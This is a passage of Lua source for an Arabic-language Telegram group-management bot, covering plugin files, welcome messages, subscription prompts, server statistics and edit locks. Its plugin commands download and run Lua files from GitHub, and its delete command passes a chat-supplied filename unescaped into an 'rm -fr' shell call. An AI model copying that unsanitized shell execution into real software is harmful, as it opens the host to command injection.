local TextE = "*••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉••\n⋄︙Source » @DevTwix .\n*"
local NumFile = 0
for name,Info in pairs(res.plugins_) do
local CheckFileisFound = io.open("Files/"..name,"r")
if CheckFileisFound then
io.close(CheckFileisFound)
CheckFile = "{ مفعل √ }"
else
CheckFile = "{ معطل ᥊ }"
end
NumFile = NumFile + 1
TextS = TextS.."*"..NumFile.."~ : *"..Info.." : \n *"..CheckFile.."* : `"..name.."`\n⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ \n"
end
send(msg.chat_id_, msg.id_,TextS..TextE) 
end
else
send(msg.chat_id_, msg.id_,"⋄︙*لا يوجد اتصال من الـapi*") 
end
end
if text == "مسح جميع الملفات" and ChCheck(msg) or text == "حذف جميع الملفات" and ChCheck(msg) then
os.execute("rm -fr Files/*")
send(msg.chat_id_,msg.id_,"⋄︙*تم حذف جميع الملفات المفعله*")
end
if text and text:match("^(تعطيل ملف) (.*)(.lua)$") and ChCheck(msg) then
local FileGet = {string.match(text, "^(تعطيل ملف) (.*)(.lua)$")}
local FileName = FileGet[2]..'.lua'
local GetJson, Res = https.request("https://raw.githubusercontent.com/TwiXtele/DevTwixFiles/main/DevTwixFiles/"..FileName)
if Res == 200 then
os.execute("rm -fr Files/"..FileName)
send(msg.chat_id_, msg.id_,"\n⋄︙*الملف ↫ *`"..FileName.."`\n⋄︙*تم حذف الملف وتعطيلة بنجاح*") 
dofile('DevTwix.lua')  
else
send(msg.chat_id_, msg.id_,"⋄︙*لا يوجد ملف بهذا الاسم*") 
end
end
if text and text:match("^(تفعيل ملف) (.*)(.lua)$") and ChCheck(msg) then
local FileGet = {string.match(text, "^(تفعيل ملف) (.*)(.lua)$")}
local FileName = FileGet[2]..'.lua'
local GetJson, Res = https.request("https://raw.githubusercontent.com/TwiXtele/DevTwixFiles/main/DevTwixFiles/"..FileName)
if Res == 200 then
local ChekAuto = io.open("Files/"..FileName,'w+')
ChekAuto:write(GetJson)
ChekAuto:close()
send(msg.chat_id_, msg.id_,"\n⋄︙*الملف ↫ *`"..FileName.."`\n⋄︙*تم تنزيله وتفعيله بنجاح *") 
dofile('DevTwix.lua')  
else
send(msg.chat_id_, msg.id_,"⋄︙لا يوجد ملف بهذا الاسم") 
end
return false
end
---------------------------------------------------------------------------------------
if text and (text == 'حذف معلومات الترحيب' or text == 'مسح معلومات الترحيب') and SecondSudo(msg) and ChCheck(msg) then    
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم حذف معلومات الترحيب', 1, 'md')   
DevHmD:del(DevTwix..'HmD:Text:BotWelcome')
DevHmD:del(DevTwix..'HmD:Photo:BotWelcome')
return false
end 
if text and (text == 'تفعيل ترحيب البوت' or text == 'تفعيل معلومات الترحيب' or text == '× تفعيل ترحيب البوت ×') and SecondSudo(msg) and ChCheck(msg) then    
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم تفعيل الترحيب عند اضافة البوت في المجموعه', 1, 'md')   
DevHmD:del(DevTwix..'HmD:Lock:BotWelcome')
return false
end 
if text and (text == 'تعطيل ترحيب البوت' or text == 'تعطيل معلومات الترحيب' or text == '× تعطيل ترحيب البوت ×') and SecondSudo(msg) and ChCheck(msg) then    
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم تعطيل الترحيب عند اضافة البوت في المجموعه', 1, 'md')   
DevHmD:set(DevTwix..'HmD:Lock:BotWelcome',true)
return false
end 
if text and (text == 'تغير معلومات الترحيب' or text == 'تغيير معلومات الترحيب' or text == '× تغير معلومات الترحيب ×') and SecondSudo(msg) and ChCheck(msg) then    
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙ارسل لي نص الترحيب', 1, 'md') 
DevHmD:del(DevTwix..'HmD:Text:BotWelcome')
DevHmD:del(DevTwix..'HmD:Photo:BotWelcome')
DevHmD:set(DevTwix.."HmD:Set:BotWelcome"..msg.sender_user_id_,"Text") 
return false
end 
if text and DevHmD:get(DevTwix.."HmD:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
if text and text:match("^الغاء$") then 
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم الغاء الامر", 1, "md") 
DevHmD:del(DevTwix.."HmD:Set:BotWelcome"..msg.sender_user_id_)   
return false
end 
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم حفظ النص ارسل لي صورة الترحيب\n⋄︙ارسل » الغاء لحفظ النص فقط", 1, 'md')   
DevHmD:set(DevTwix.."HmD:Text:BotWelcome",text) 
DevHmD:set(DevTwix.."HmD:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
return false 
end 
if DevHmD:get(DevTwix.."HmD:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
if text and text:match("^الغاء$") then 
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم حفظ النص والغاء حفظ صورة الترحيب", 1, "md") 
DevHmD:del(DevTwix.."HmD:Set:BotWelcome"..msg.sender_user_id_)    
return false
end 
if msg.content_.photo_ and msg.content_.photo_.sizes_[1] then   
DevHmD:set(DevTwix.."HmD:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم حفظ النص وصورة الترحيب", 1, 'md')   
DevHmD:del(DevTwix.."HmD:Set:BotWelcome"..msg.sender_user_id_)   
end
return false
end
---------------------------------------------------------------------------------------
if text and text:match("^ضع كليشه المطور$") or text and text:match("^وضع كليشه المطور$") or text and text:match("^تغيير كليشه المطور$") or text and text:match("^× ضع كليشة المطور ×$") and ChCheck(msg) then
if not Sudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙ارسل كليشة المطور الان ", 1, "md")
DevHmD:setex(DevTwix.."HmD:DevText"..msg.chat_id_..":" .. msg.sender_user_id_, 300, true)
end end
if text and text:match("^مسح كليشه المطور$") or text and text:match("^حذف كليشه المطور$") then
if not SecondSudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم حذف كليشة المطور", 1, "md")
DevHmD:del(DevTwix.."DevText")
end end
---------------------------------------------------------------------------------------
if DevHmD:get(DevTwix.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم الغاء الامر", 1, "md") 
DevHmD:del(DevTwix.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevHmD:del(DevTwix.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
DevHmD:set(DevTwix..'HmD:ChText',texxt)
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم تغيير كليشة الاشتراك الاجباري', 1, 'md')
end
if text and text:match("^» تغير كليشه الاشتراك ✧$") and Sudo(msg)  or text and text:match("^تغيير كليشه الاشتراك$") and Sudo(msg) then  
DevHmD:setex(DevTwix.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)   
local text = '⋄︙حسنا ارسل كليشة الاشتراك الجديده'  
Dev_HmD(msg.chat_id_, msg.id_, 1,text, 1, 'md') 
end
if text == "حذف كليشه الاشتراك الاجباري" or text == "» حذف كليشه الاشتراك ✧" then  
if not Sudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمطور الاساسي فقط ', 1, 'md')
else
DevHmD:del(DevTwix..'HmD:ChText')
textt = "⋄︙تم حذف كليشة الاشتراك الاجباري"
Dev_HmD(msg.chat_id_, msg.id_, 1,textt, 1, 'md') 
end end
if text == 'كليشه الاشتراك' or text == 'جلب كليشه الاشتراك' or text == '» كليشه الاشتراك ✧' then
if not SecondSudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمطور الاساسي فقط ', 1, 'md')
else
local chtext = DevHmD:get(DevTwix.."HmD:ChText")
if chtext then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙كليشة الاشتراك »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n['..chtext..']', 1, 'md')
else
if DevHmD:get(DevTwix.."HmD:ChId") then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevHmD:get(DevTwix.."HmD:ChId"))
local GetInfo = JSON.decode(Check)
if GetInfo.result.username then
User = "https://t.me/"..GetInfo.result.username
else
User = GetInfo.result.invite_link
end
Text = "⋄︙*عذرا لاتستطيع استخدام البوت !*\n⋄︙*عليك الاشتراك في القناة اولا :*"
keyboard = {} 
keyboard.inline_keyboard = {{{text=GetInfo.result.title,url=User}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لم يتم تعيين قناة الاشتراك الاجباري \n⋄︙ارسل » تعيين قناة الاشتراك للتعيين ', 1, 'md')
end end end end
---------------------------------------------------------------------------------------
if text == 'القناة' and ChTwixDev(msg) or text == 'قناة السورس' and ChTwixDev(msg) or text == 'قناه السورس' and ChTwixDev(msg) or text == 'قنات السورس' and ChTwixDev(msg) or text == '× قناة السورس ×' and ChTwixDev(msg) then 
Text = [[
⋄︙[قناة السورس](https://t.me/DevTwix)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✧ قناة السورس',url="t.me/DevTwix"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/DevTwix&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
---------------------------------------------------------------------------------------
if text == "مبرمج السورس" and ChTwixDev(msg) or text == "مطور السورس" and ChTwixDev(msg) or text == "وين المبرمج" and ChTwixDev(msg) or text == "المبرمج" and ChTwixDev(msg) or text == "مبرمج السورس ⧞" and ChTwixDev(msg) then 
Text = [[
⋄︙[مبرمج السورس](https://t.me/VLVLVI)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✧ مبرمج السورس',url="t.me/VLVLVI"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/VLVLVI&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
---------------------------------------------------------------------------------------
if text == 'معلومات السيرفر' or text == 'السيرفر' or text == '× معلومات السيرفر ×' then 
if not HmDSudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_HmD(msg.chat_id_, msg.id_, 1, io.popen([[
LinuxVersion=`lsb_release -ds`
MemoryUsage=`free -m | awk 'NR==2{printf "%s/%sMB {%.2f%%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
Percentage=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
UpTime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"يوماً ,",h+0,"ساعة ,",m+0,"دقيقة"}'`
echo '*• نظام التشغيل » *\n`'"$LinuxVersion"'`' 
echo '•••┉ ┉ ┉ ••• ┉ ┉ ┉•••\n*• الذاكره العشوائيه » *\n`'"$MemoryUsage"'`'
echo '•••┉ ┉ ┉ ••• ┉ ┉ ┉•••\n*• وحدة التخزين » *\n`'"$HardDisk"'`'
echo '•••┉ ┉ ┉ ••• ┉ ┉ ┉•••\n*• المعالج » *\n`'"`grep -c processor /proc/cpuinfo`""Core ~ {$Percentage%} "'`'
echo '•••┉ ┉ ┉ ••• ┉ ┉ ┉•••\n*• الدخول » *\n`'`whoami`'`'
echo '•••┉ ┉ ┉ ••• ┉ ┉ ┉•••\n*• مدة تشغيل السيرفر » *\n\n`'"$UpTime"'`'
]]):read('*a'), 1, 'md')
end
end
---------------------------------------------------------------------------------------
DevTwixFiles(msg)
---------------------------------------------------------------------------------------
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.message_id_)},function(extra, result, success)
DevHmD:incr(DevTwix..'HmD:EditMsg'..result.chat_id_..result.sender_user_id_)
local text = result.content_.text_ or result.content_.caption_
local Text = result.content_.text_
if DevHmD:get(DevTwix..'HmD:Lock:EditMsgs'..msg.chat_id_) and not Text and not HmDConstructor(result) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
Media = 'الميديا'
if result.content_.ID == "MessagePhoto" then Media = 'الصوره'
elseif result.content_.ID == "MessageVideo" then Media = 'الفيديو'
elseif result.content_.ID == "MessageAnimation" then Media = 'المتحركه'
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,dp) 
local HmDname = '⋄︙العضو » ['..dp.first_name_..'](tg://user?id='..dp.id_..')'
local HmDid = '⋄︙ايديه » `'..dp.id_..'`'
local HmDtext = '⋄︙قام بالتعديل على '..Media
local HmDtxt = '•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n⋄︙تعالو يامشرفين اكو مخرب'
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,HmD) 
local admins = HmD.members_  
text = '\n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n'
for i=0 , #admins do 
if not HmD.members_[i].bot_info_ then
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,data) 
if data.first_name_ ~= false then
text = text.."~ [@"..data.username_.."]\n"
end
if #admins == i then 
SendText(msg.chat_id_, HmDname..'\n'..HmDid..'\n'..HmDtext..text..HmDtxt,0,'md') 
end
end,nil)
end
end
end,nil)
end,nil)
end
if not VipMem(result) then
Filters(result, text)
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") or text:match("#") or text:match("@") or text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match("[Ww][Ww][Ww].") or text:match(".[Xx][Yy][Zz]") then
if DevHmD:get(DevTwix..'HmD:Lock:EditMsgs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
end end end 
end,nil)
---------------------------------------------------------------------------------------
elseif (data.ID == "UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local GetMsgPin = DevHmD:get(DevTwix..'HmD:PinnedMsgs'..msg.chat_id_)
if GetMsgPin ~= nil then
if text == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;DevHmD:del(DevTwix..'HmD:PinnedMsgs'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if GetMsgPin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevHmD:del(DevTwix..'HmD:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
if msg.content_.animation_.animation_.persistent_id_ == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevHmD:del(DevTwix..'HmD:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevHmD:del(DevTwix..'HmD:PinnedMsgs'..msg.chat_id_) end,nil)   
end end end
---------------------------------------------------------------------------------------
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then
print('\27[30;32mجاري تنظيف المجموعات الوهميه يرجى الانتظار\n\27[1;37m')
local PvList = DevHmD:smembers(DevTwix..'HmD:Users')  
for k,v in pairs(PvList) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end 
local GpList = DevHmD:smembers(DevTwix..'HmD:Groups') 
for k,v in pairs(GpList) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
tdcli_function({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=DevTwix,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
DevHmD:srem(DevTwix..'HmD:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevHmD:srem(DevTwix..'HmD:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
DevHmD:srem(DevTwix..'HmD:Groups',v)  
end
if data and data.code_ and data.code_ == 400 then
DevHmD:srem(DevTwix..'HmD:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
DevHmD:sadd(DevTwix..'HmD:Groups',v)  
end end,nil) end
end
end 